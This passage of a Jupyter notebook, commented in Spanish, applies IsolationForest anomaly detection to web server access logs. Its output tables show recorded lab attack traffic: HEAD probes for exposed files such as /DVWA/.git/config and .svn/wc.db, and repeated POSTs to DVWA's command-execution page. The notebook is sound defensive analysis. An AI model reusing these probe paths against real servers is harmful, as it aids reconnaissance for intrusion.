       "\n",
       ".sk-estimator-doc-link:hover span {\n",
       "  display: block;\n",
       "}\n",
       "\n",
       "/* \"?\"-specific style due to the `<a>` HTML tag */\n",
       "\n",
       "#sk-container-id-1 a.estimator_doc_link {\n",
       "  float: right;\n",
       "  font-size: 1rem;\n",
       "  line-height: 1em;\n",
       "  font-family: monospace;\n",
       "  background-color: var(--sklearn-color-background);\n",
       "  border-radius: 1rem;\n",
       "  height: 1rem;\n",
       "  width: 1rem;\n",
       "  text-decoration: none;\n",
       "  /* unfitted */\n",
       "  color: var(--sklearn-color-unfitted-level-1);\n",
       "  border: var(--sklearn-color-unfitted-level-1) 1pt solid;\n",
       "}\n",
       "\n",
       "#sk-container-id-1 a.estimator_doc_link.fitted {\n",
       "  /* fitted */\n",
       "  border: var(--sklearn-color-fitted-level-1) 1pt solid;\n",
       "  color: var(--sklearn-color-fitted-level-1);\n",
       "}\n",
       "\n",
       "/* On hover */\n",
       "#sk-container-id-1 a.estimator_doc_link:hover {\n",
       "  /* unfitted */\n",
       "  background-color: var(--sklearn-color-unfitted-level-3);\n",
       "  color: var(--sklearn-color-background);\n",
       "  text-decoration: none;\n",
       "}\n",
       "\n",
       "#sk-container-id-1 a.estimator_doc_link.fitted:hover {\n",
       "  /* fitted */\n",
       "  background-color: var(--sklearn-color-fitted-level-3);\n",
       "}\n",
       "</style><div id=\"sk-container-id-1\" class=\"sk-top-container\"><div class=\"sk-text-repr-fallback\"><pre>IsolationForest(contamination=0.2)</pre><b>In a Jupyter environment, please rerun this cell to show the HTML representation or trust the notebook. <br />On GitHub, the HTML representation is unable to render, please try loading this page with nbviewer.org.</b></div><div class=\"sk-container\" hidden><div class=\"sk-item\"><div class=\"sk-estimator fitted sk-toggleable\"><input class=\"sk-toggleable__control sk-hidden--visually\" id=\"sk-estimator-id-1\" type=\"checkbox\" checked><label for=\"sk-estimator-id-1\" class=\"sk-toggleable__label fitted sk-toggleable__label-arrow fitted\">&nbsp;&nbsp;IsolationForest<a class=\"sk-estimator-doc-link fitted\" rel=\"noreferrer\" target=\"_blank\" href=\"https://scikit-learn.org/1.4/modules/generated/sklearn.ensemble.IsolationForest.html\">?<span>Documentation for IsolationForest</span></a><span class=\"sk-estimator-doc-link fitted\">i<span>Fitted</span></span></label><div class=\"sk-toggleable__content fitted\"><pre>IsolationForest(contamination=0.2)</pre></div> </div></div></div></div>"
      ],
      "text/plain": [
       "IsolationForest(contamination=0.2)"
      ]
     },
     "execution_count": 115,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "model = IsolationForest(contamination=0.2)  # Ajusta el parámetro de contaminación según tus datos\n",
    "model.fit(X_train_scaled)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 116,
   "metadata": {},
   "outputs": [],
   "source": [
    "X_original_scaled = scaler.transform(df[variables])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 117,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "7922\n"
     ]
    }
   ],
   "source": [
    "df['anomaly_score'] = model.decision_function(X_original_scaled)\n",
    "df['anomaly'] = model.predict(X_original_scaled)\n",
    "\n",
    "# -1 para anomalías, 1 para puntos normales\n",
    "df['anomaly'] = df['anomaly'].apply(lambda x: 1 if x == -1 else 0)\n",
    "\n",
    "# Mostrar las anomalías detectadas\n",
    "anomalies = df[df['anomaly'] == 1]\n",
    "print(len(anomalies))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 118,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>index</th>\n",
       "      <th>Client IP</th>\n",
       "      <th>Ident</th>\n",
       "      <th>Auth</th>\n",
       "      <th>Timestamp</th>\n",
       "      <th>Method</th>\n",
       "      <th>Request</th>\n",
       "      <th>HTTP Version</th>\n",
       "      <th>Status Code</th>\n",
       "      <th>Bytes Sent</th>\n",
       "      <th>...</th>\n",
       "      <th>Timestamp:</th>\n",
       "      <th>Hora</th>\n",
       "      <th>Dia</th>\n",
       "      <th>Latencia</th>\n",
       "      <th>Peticiones</th>\n",
       "      <th>Envios</th>\n",
       "      <th>Bytes Recibidos</th>\n",
       "      <th>Bytes Enviados</th>\n",
       "      <th>anomaly_score</th>\n",
       "      <th>anomaly</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>2</td>\n",
       "      <td>192.168.4.164</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>22/Dec/2023:15:19:06 +0300</td>\n",
       "      <td>HEAD</td>\n",
       "      <td>/DVWA/.git/config</td>\n",
       "      <td>HTTP/1.1</td>\n",
       "      <td>404</td>\n",
       "      <td>139</td>\n",
       "      <td>...</td>\n",
       "      <td>2023-12-22 15:19:06+03:00</td>\n",
       "      <td>15</td>\n",
       "      <td>22</td>\n",
       "      <td>0.0</td>\n",
       "      <td>1</td>\n",
       "      <td>0</td>\n",
       "      <td>139</td>\n",
       "      <td>0</td>\n",
       "      <td>-0.217804</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>4</td>\n",
       "      <td>192.168.4.164</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>22/Dec/2023:15:19:06 +0300</td>\n",
       "      <td>HEAD</td>\n",
       "      <td>/DVWA/.svn/all-wcprops</td>\n",
       "      <td>HTTP/1.1</td>\n",
       "      <td>404</td>\n",
       "      <td>139</td>\n",
       "      <td>...</td>\n",
       "      <td>2023-12-22 15:19:06+03:00</td>\n",
       "      <td>15</td>\n",
       "      <td>22</td>\n",
       "      <td>0.0</td>\n",
       "      <td>1</td>\n",
       "      <td>0</td>\n",
       "      <td>139</td>\n",
       "      <td>0</td>\n",
       "      <td>-0.217804</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>6</td>\n",
       "      <td>192.168.4.164</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>22/Dec/2023:15:19:06 +0300</td>\n",
       "      <td>HEAD</td>\n",
       "      <td>/DVWA/.svn/wc.db</td>\n",
       "      <td>HTTP/1.1</td>\n",
       "      <td>404</td>\n",
       "      <td>139</td>\n",
       "      <td>...</td>\n",
       "      <td>2023-12-22 15:19:06+03:00</td>\n",
       "      <td>15</td>\n",
       "      <td>22</td>\n",
       "      <td>0.0</td>\n",
       "      <td>1</td>\n",
       "      <td>0</td>\n",
       "      <td>139</td>\n",
       "      <td>0</td>\n",
       "      <td>-0.217804</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>5</th>\n",
       "      <td>8</td>\n",
       "      <td>192.168.4.164</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>22/Dec/2023:15:19:06 +0300</td>\n",
       "      <td>HEAD</td>\n",
       "      <td>/DVWA/~.aspx</td>\n",
       "      <td>HTTP/1.1</td>\n",
       "      <td>404</td>\n",
       "      <td>139</td>\n",
       "      <td>...</td>\n",
       "      <td>2023-12-22 15:19:06+03:00</td>\n",
       "      <td>15</td>\n",
       "      <td>22</td>\n",
       "      <td>0.0</td>\n",
       "      <td>1</td>\n",
       "      <td>0</td>\n",
       "      <td>139</td>\n",
       "      <td>0</td>\n",
       "      <td>-0.217804</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>6</th>\n",
       "      <td>10</td>\n",
       "      <td>192.168.4.164</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>22/Dec/2023:15:19:06 +0300</td>\n",
       "      <td>HEAD</td>\n",
       "      <td>/DVWA/cgi-bin/</td>\n",
       "      <td>HTTP/1.1</td>\n",
       "      <td>404</td>\n",
       "      <td>139</td>\n",
       "      <td>...</td>\n",
       "      <td>2023-12-22 15:19:06+03:00</td>\n",
       "      <td>15</td>\n",
       "      <td>22</td>\n",
       "      <td>0.0</td>\n",
       "      <td>1</td>\n",
       "      <td>0</td>\n",
       "      <td>139</td>\n",
       "      <td>0</td>\n",
       "      <td>-0.217804</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>...</th>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>11040</th>\n",
       "      <td>13615</td>\n",
       "      <td>192.168.4.25</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>22/Dec/2022:16:21:10 +0300</td>\n",
       "      <td>POST</td>\n",
       "      <td>/index.php/component/search/</td>\n",
       "      <td>HTTP/1.1</td>\n",
       "      <td>303</td>\n",
       "      <td>350</td>\n",
       "      <td>...</td>\n",
       "      <td>2022-12-22 16:21:10+03:00</td>\n",
       "      <td>16</td>\n",
       "      <td>22</td>\n",
       "      <td>1.0</td>\n",
       "      <td>0</td>\n",
       "      <td>1</td>\n",
       "      <td>0</td>\n",
       "      <td>350</td>\n",
       "      <td>-0.294349</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>11041</th>\n",
       "      <td>13616</td>\n",
       "      <td>192.168.4.25</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>22/Dec/2022:16:32:53 +0300</td>\n",
       "      <td>POST</td>\n",
       "      <td>/index.php/component/search/</td>\n",
       "      <td>HTTP/1.1</td>\n",
       "      <td>200</td>\n",
       "      <td>3055</td>\n",
       "      <td>...</td>\n",
       "      <td>2022-12-22 16:32:53+03:00</td>\n",
       "      <td>16</td>\n",
       "      <td>22</td>\n",
       "      <td>1.0</td>\n",
       "      <td>0</td>\n",
       "      <td>1</td>\n",
       "      <td>0</td>\n",
       "      <td>3055</td>\n",
       "      <td>-0.356550</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>11042</th>\n",
       "      <td>13618</td>\n",
       "      <td>192.168.4.25</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>22/Dec/2022:16:33:44 +0300</td>\n",
       "      <td>POST</td>\n",
       "      <td>/index.php/component/search/</td>\n",
       "      <td>HTTP/1.1</td>\n",
       "      <td>303</td>\n",
       "      <td>417</td>\n",
       "      <td>...</td>\n",
       "      <td>2022-12-22 16:33:44+03:00</td>\n",
       "      <td>16</td>\n",
       "      <td>22</td>\n",
       "      <td>1.0</td>\n",
       "      <td>0</td>\n",
       "      <td>1</td>\n",
       "      <td>0</td>\n",
       "      <td>417</td>\n",
       "      <td>-0.299685</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>11043</th>\n",
       "      <td>13619</td>\n",
       "      <td>192.168.4.25</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>22/Dec/2022:16:23:07 +0300</td>\n",
       "      <td>POST</td>\n",
       "      <td>/index.php/component/search/</td>\n",
       "      <td>HTTP/1.1</td>\n",
       "      <td>303</td>\n",
       "      <td>393</td>\n",
       "      <td>...</td>\n",
       "      <td>2022-12-22 16:23:07+03:00</td>\n",
       "      <td>16</td>\n",
       "      <td>22</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0</td>\n",
       "      <td>1</td>\n",
       "      <td>0</td>\n",
       "      <td>393</td>\n",
       "      <td>-0.297590</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>11044</th>\n",
       "      <td>13620</td>\n",
       "      <td>192.168.4.25</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>22/Dec/2022:16:32:54 +0300</td>\n",
       "      <td>POST</td>\n",
       "      <td>/index.php/component/search/</td>\n",
       "      <td>HTTP/1.1</td>\n",
       "      <td>200</td>\n",
       "      <td>3054</td>\n",
       "      <td>...</td>\n",
       "      <td>2022-12-22 16:32:54+03:00</td>\n",
       "      <td>16</td>\n",
       "      <td>22</td>\n",
       "      <td>1.0</td>\n",
       "      <td>0</td>\n",
       "      <td>1</td>\n",
       "      <td>0</td>\n",
       "      <td>3054</td>\n",
       "      <td>-0.356550</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "<p>7922 rows × 25 columns</p>\n",
       "</div>"
      ],
      "text/plain": [
       "       index      Client IP Ident Auth                   Timestamp Method  \\\n",
       "2          2  192.168.4.164     -    -  22/Dec/2023:15:19:06 +0300   HEAD   \n",
       "3          4  192.168.4.164     -    -  22/Dec/2023:15:19:06 +0300   HEAD   \n",
       "4          6  192.168.4.164     -    -  22/Dec/2023:15:19:06 +0300   HEAD   \n",
       "5          8  192.168.4.164     -    -  22/Dec/2023:15:19:06 +0300   HEAD   \n",
       "6         10  192.168.4.164     -    -  22/Dec/2023:15:19:06 +0300   HEAD   \n",
       "...      ...            ...   ...  ...                         ...    ...   \n",
       "11040  13615   192.168.4.25     -    -  22/Dec/2022:16:21:10 +0300   POST   \n",
       "11041  13616   192.168.4.25     -    -  22/Dec/2022:16:32:53 +0300   POST   \n",
       "11042  13618   192.168.4.25     -    -  22/Dec/2022:16:33:44 +0300   POST   \n",
       "11043  13619   192.168.4.25     -    -  22/Dec/2022:16:23:07 +0300   POST   \n",
       "11044  13620   192.168.4.25     -    -  22/Dec/2022:16:32:54 +0300   POST   \n",
       "\n",
       "                            Request HTTP Version  Status Code  Bytes Sent  \\\n",
       "2                 /DVWA/.git/config     HTTP/1.1          404         139   \n",
       "3            /DVWA/.svn/all-wcprops     HTTP/1.1          404         139   \n",
       "4                  /DVWA/.svn/wc.db     HTTP/1.1          404         139   \n",
       "5                      /DVWA/~.aspx     HTTP/1.1          404         139   \n",
       "6                    /DVWA/cgi-bin/     HTTP/1.1          404         139   \n",
       "...                             ...          ...          ...         ...   \n",
       "11040  /index.php/component/search/     HTTP/1.1          303         350   \n",
       "11041  /index.php/component/search/     HTTP/1.1          200        3055   \n",
       "11042  /index.php/component/search/     HTTP/1.1          303         417   \n",
       "11043  /index.php/component/search/     HTTP/1.1          303         393   \n",
       "11044  /index.php/component/search/     HTTP/1.1          200        3054   \n",
       "\n",
       "       ...                Timestamp: Hora  Dia  Latencia  Peticiones Envios  \\\n",
       "2      ... 2023-12-22 15:19:06+03:00   15   22       0.0           1      0   \n",
       "3      ... 2023-12-22 15:19:06+03:00   15   22       0.0           1      0   \n",
       "4      ... 2023-12-22 15:19:06+03:00   15   22       0.0           1      0   \n",
       "5      ... 2023-12-22 15:19:06+03:00   15   22       0.0           1      0   \n",
       "6      ... 2023-12-22 15:19:06+03:00   15   22       0.0           1      0   \n",
       "...    ...                       ...  ...  ...       ...         ...    ...   \n",
       "11040  ... 2022-12-22 16:21:10+03:00   16   22       1.0           0      1   \n",
       "11041  ... 2022-12-22 16:32:53+03:00   16   22       1.0           0      1   \n",
       "11042  ... 2022-12-22 16:33:44+03:00   16   22       1.0           0      1   \n",
       "11043  ... 2022-12-22 16:23:07+03:00   16   22       0.0           0      1   \n",
       "11044  ... 2022-12-22 16:32:54+03:00   16   22       1.0           0      1   \n",
       "\n",
       "       Bytes Recibidos  Bytes Enviados  anomaly_score  anomaly  \n",
       "2                  139               0      -0.217804        1  \n",
       "3                  139               0      -0.217804        1  \n",
       "4                  139               0      -0.217804        1  \n",
       "5                  139               0      -0.217804        1  \n",
       "6                  139               0      -0.217804        1  \n",
       "...                ...             ...            ...      ...  \n",
       "11040                0             350      -0.294349        1  \n",
       "11041                0            3055      -0.356550        1  \n",
       "11042                0             417      -0.299685        1  \n",
       "11043                0             393      -0.297590        1  \n",
       "11044                0            3054      -0.356550        1  \n",
       "\n",
       "[7922 rows x 25 columns]"
      ]
     },
     "execution_count": 118,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "anomalies"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "Client IP      anomaly\n",
       "192.168.4.164  1          2826\n",
       "               0          2552\n",
       "192.168.4.25   1          5096\n",
       "               0           571\n",
       "Name: count, dtype: int64"
      ]
     },
     "execution_count": 232,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df.groupby('Client IP')['anomaly'].value_counts()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>index</th>\n",
       "      <th>Client IP</th>\n",
       "      <th>Ident</th>\n",
       "      <th>Auth</th>\n",
       "      <th>Timestamp</th>\n",
       "      <th>Method</th>\n",
       "      <th>Request</th>\n",
       "      <th>HTTP Version</th>\n",
       "      <th>Status Code</th>\n",
       "      <th>Bytes Sent</th>\n",
       "      <th>...</th>\n",
       "      <th>Hora</th>\n",
       "      <th>Dia</th>\n",
       "      <th>Latencia</th>\n",
       "      <th>Recibos</th>\n",
       "      <th>Envios</th>\n",
       "      <th>Bytes Recibidos</th>\n",
       "      <th>Bytes Enviados</th>\n",
       "      <th>anomaly_score</th>\n",
       "      <th>anomaly</th>\n",
       "      <th>Cluster</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>2</td>\n",
       "      <td>192.168.4.164</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>22/Dec/2023:15:19:06 +0300</td>\n",
       "      <td>HEAD</td>\n",
       "      <td>/DVWA/.git/config</td>\n",
       "      <td>HTTP/1.1</td>\n",
       "      <td>404</td>\n",
       "      <td>139</td>\n",
       "      <td>...</td>\n",
       "      <td>15</td>\n",
       "      <td>22</td>\n",
       "      <td>0.0</td>\n",
       "      <td>1</td>\n",
       "      <td>0</td>\n",
       "      <td>139</td>\n",
       "      <td>0</td>\n",
       "      <td>-0.208611</td>\n",
       "      <td>1</td>\n",
       "      <td>2</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>4</td>\n",
       "      <td>192.168.4.164</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>22/Dec/2023:15:19:06 +0300</td>\n",
       "      <td>HEAD</td>\n",
       "      <td>/DVWA/.svn/all-wcprops</td>\n",
       "      <td>HTTP/1.1</td>\n",
       "      <td>404</td>\n",
       "      <td>139</td>\n",
       "      <td>...</td>\n",
       "      <td>15</td>\n",
       "      <td>22</td>\n",
       "      <td>0.0</td>\n",
       "      <td>1</td>\n",
       "      <td>0</td>\n",
       "      <td>139</td>\n",
       "      <td>0</td>\n",
       "      <td>-0.208611</td>\n",
       "      <td>1</td>\n",
       "      <td>2</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>6</td>\n",
       "      <td>192.168.4.164</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>22/Dec/2023:15:19:06 +0300</td>\n",
       "      <td>HEAD</td>\n",
       "      <td>/DVWA/.svn/wc.db</td>\n",
       "      <td>HTTP/1.1</td>\n",
       "      <td>404</td>\n",
       "      <td>139</td>\n",
       "      <td>...</td>\n",
       "      <td>15</td>\n",
       "      <td>22</td>\n",
       "      <td>0.0</td>\n",
       "      <td>1</td>\n",
       "      <td>0</td>\n",
       "      <td>139</td>\n",
       "      <td>0</td>\n",
       "      <td>-0.208611</td>\n",
       "      <td>1</td>\n",
       "      <td>2</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>5</th>\n",
       "      <td>8</td>\n",
       "      <td>192.168.4.164</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>22/Dec/2023:15:19:06 +0300</td>\n",
       "      <td>HEAD</td>\n",
       "      <td>/DVWA/~.aspx</td>\n",
       "      <td>HTTP/1.1</td>\n",
       "      <td>404</td>\n",
       "      <td>139</td>\n",
       "      <td>...</td>\n",
       "      <td>15</td>\n",
       "      <td>22</td>\n",
       "      <td>0.0</td>\n",
       "      <td>1</td>\n",
       "      <td>0</td>\n",
       "      <td>139</td>\n",
       "      <td>0</td>\n",
       "      <td>-0.208611</td>\n",
       "      <td>1</td>\n",
       "      <td>2</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>6</th>\n",
       "      <td>10</td>\n",
       "      <td>192.168.4.164</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>22/Dec/2023:15:19:06 +0300</td>\n",
       "      <td>HEAD</td>\n",
       "      <td>/DVWA/cgi-bin/</td>\n",
       "      <td>HTTP/1.1</td>\n",
       "      <td>404</td>\n",
       "      <td>139</td>\n",
       "      <td>...</td>\n",
       "      <td>15</td>\n",
       "      <td>22</td>\n",
       "      <td>0.0</td>\n",
       "      <td>1</td>\n",
       "      <td>0</td>\n",
       "      <td>139</td>\n",
       "      <td>0</td>\n",
       "      <td>-0.208611</td>\n",
       "      <td>1</td>\n",
       "      <td>2</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>...</th>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>5372</th>\n",
       "      <td>7080</td>\n",
       "      <td>192.168.4.164</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>22/Dec/2023:15:36:03 +0300</td>\n",
       "      <td>POST</td>\n",
       "      <td>/DVWA/vulnerabilities/exec/</td>\n",
       "      <td>HTTP/1.1</td>\n",
       "      <td>200</td>\n",
       "      <td>1817</td>\n",
       "      <td>...</td>\n",
       "      <td>15</td>\n",
       "      <td>22</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0</td>\n",
       "      <td>1</td>\n",
       "      <td>0</td>\n",
       "      <td>1817</td>\n",
       "      <td>-0.344653</td>\n",
       "      <td>1</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>5373</th>\n",
       "      <td>7081</td>\n",
       "      <td>192.168.4.164</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>22/Dec/2023:15:36:15 +0300</td>\n",
       "      <td>POST</td>\n",
       "      <td>/DVWA/vulnerabilities/exec/</td>\n",
       "      <td>HTTP/1.1</td>\n",
       "      <td>200</td>\n",
       "      <td>1817</td>\n",
       "      <td>...</td>\n",
       "      <td>15</td>\n",
       "      <td>22</td>\n",
       "      <td>12.0</td>\n",
       "      <td>0</td>\n",
       "      <td>1</td>\n",
       "      <td>0</td>\n",
       "      <td>1817</td>\n",
       "      <td>-0.361155</td>\n",
       "      <td>1</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>5374</th>\n",
       "      <td>7083</td>\n",
       "      <td>192.168.4.164</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>22/Dec/2023:15:36:27 +0300</td>\n",
       "      <td>POST</td>\n",
       "      <td>/DVWA/vulnerabilities/exec/</td>\n",
       "      <td>HTTP/1.1</td>\n",
       "      <td>200</td>\n",
       "      <td>1817</td>\n",
       "      <td>...</td>\n",
       "      <td>15</td>\n",
       "      <td>22</td>\n",
       "      <td>12.0</td>\n",
       "      <td>0</td>\n",
       "      <td>1</td>\n",
       "      <td>0</td>\n",
       "      <td>1817</td>\n",
       "      <td>-0.361155</td>\n",
       "      <td>1</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>5376</th>\n",
       "      <td>7085</td>\n",
       "      <td>192.168.4.164</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>22/Dec/2023:15:37:15 +0300</td>\n",
       "      <td>POST</td>\n",
       "      <td>/DVWA/vulnerabilities/exec/</td>\n",
       "      <td>HTTP/1.1</td>\n",
       "      <td>200</td>\n",
       "      <td>1714</td>\n",
       "      <td>...</td>\n",
       "      <td>15</td>\n",
       "      <td>22</td>\n",
       "      <td>36.0</td>\n",
       "      <td>0</td>\n",
       "      <td>1</td>\n",
       "      <td>0</td>\n",
       "      <td>1714</td>\n",
       "      <td>-0.370226</td>\n",
       "      <td>1</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>5377</th>\n",
       "      <td>7087</td>\n",
       "      <td>192.168.4.164</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>22/Dec/2023:15:37:27 +0300</td>\n",
       "      <td>POST</td>\n",
       "      <td>/DVWA/vulnerabilities/exec/</td>\n",
       "      <td>HTTP/1.1</td>\n",
       "      <td>200</td>\n",
       "      <td>1714</td>\n",
       "      <td>...</td>\n",
       "      <td>15</td>\n",
       "      <td>22</td>\n",
       "      <td>12.0</td>\n",
       "      <td>0</td>\n",
       "      <td>1</td>\n",
       "      <td>0</td>\n",
       "      <td>1714</td>\n",
       "      <td>-0.361155</td>\n",
       "      <td>1</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "<p>2826 rows × 26 columns</p>\n",
       "</div>"
      ],
      "text/plain": [
       "      index      Client IP Ident Auth                   Timestamp Method  \\\n",
       "2         2  192.168.4.164     -    -  22/Dec/2023:15:19:06 +0300   HEAD   \n",
       "3         4  192.168.4.164     -    -  22/Dec/2023:15:19:06 +0300   HEAD   \n",
       "4         6  192.168.4.164     -    -  22/Dec/2023:15:19:06 +0300   HEAD   \n",
       "5         8  192.168.4.164     -    -  22/Dec/2023:15:19:06 +0300   HEAD   \n",
       "6        10  192.168.4.164     -    -  22/Dec/2023:15:19:06 +0300   HEAD   \n",
       "...     ...            ...   ...  ...                         ...    ...   \n",
       "5372   7080  192.168.4.164     -    -  22/Dec/2023:15:36:03 +0300   POST   \n",
       "5373   7081  192.168.4.164     -    -  22/Dec/2023:15:36:15 +0300   POST   \n",
       "5374   7083  192.168.4.164     -    -  22/Dec/2023:15:36:27 +0300   POST   \n",
       "5376   7085  192.168.4.164     -    -  22/Dec/2023:15:37:15 +0300   POST   \n",
       "5377   7087  192.168.4.164     -    -  22/Dec/2023:15:37:27 +0300   POST   \n",
       "\n",
       "                          Request HTTP Version  Status Code  Bytes Sent  ...  \\\n",
       "2               /DVWA/.git/config     HTTP/1.1          404         139  ...   \n",
       "3          /DVWA/.svn/all-wcprops     HTTP/1.1          404         139  ...   \n",
       "4                /DVWA/.svn/wc.db     HTTP/1.1          404         139  ...   \n",
       "5                    /DVWA/~.aspx     HTTP/1.1          404         139  ...   \n",
       "6                  /DVWA/cgi-bin/     HTTP/1.1          404         139  ...   \n",
       "...                           ...          ...          ...         ...  ...   \n",
       "5372  /DVWA/vulnerabilities/exec/     HTTP/1.1          200        1817  ...   \n",
       "5373  /DVWA/vulnerabilities/exec/     HTTP/1.1          200        1817  ...   \n",
       "5374  /DVWA/vulnerabilities/exec/     HTTP/1.1          200        1817  ...   \n",
       "5376  /DVWA/vulnerabilities/exec/     HTTP/1.1          200        1714  ...   \n",
       "5377  /DVWA/vulnerabilities/exec/     HTTP/1.1          200        1714  ...   \n",
       "\n",
       "     Hora Dia  Latencia  Recibos  Envios Bytes Recibidos  Bytes Enviados  \\\n",
       "2      15  22       0.0        1       0             139               0   \n",
       "3      15  22       0.0        1       0             139               0   \n",
       "4      15  22       0.0        1       0             139               0   \n",
       "5      15  22       0.0        1       0             139               0   \n",
       "6      15  22       0.0        1       0             139               0   \n",
       "...   ...  ..       ...      ...     ...             ...             ...   \n",
       "5372   15  22       0.0        0       1               0            1817   \n",
       "5373   15  22      12.0        0       1               0            1817   \n",
       "5374   15  22      12.0        0       1               0            1817   \n",
       "5376   15  22      36.0        0       1               0            1714   \n",
